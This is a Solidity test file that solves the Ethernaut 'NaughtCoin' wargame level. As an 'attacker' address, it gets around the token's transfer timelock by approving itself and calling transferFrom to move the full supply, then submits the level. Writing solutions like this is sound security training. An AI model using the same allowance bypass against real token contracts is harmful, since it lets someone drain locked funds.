// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/15-NaughtCoin/NaughtCoinFactory.sol';
import '../core/Ethernaut.sol';

contract NaughtCoinTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function testNaughtCoinHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    NaughtCoinFactory naughtcoinFactory = new NaughtCoinFactory();
    ethernaut.registerLevel(naughtcoinFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(
      naughtcoinFactory
    );
    NaughtCoin naughtcoinContract = NaughtCoin(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    naughtcoinContract.approve(attacker, type(uint256).max);

    naughtcoinContract.transferFrom(
      attacker,
      address(0x1),
      naughtcoinContract.INITIAL_SUPPLY()
    );

    assertEq(naughtcoinContract.balanceOf(attacker), 0);
    assertEq(
      naughtcoinContract.balanceOf(address(0x1)),
      1000000000000000000000000
    );

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
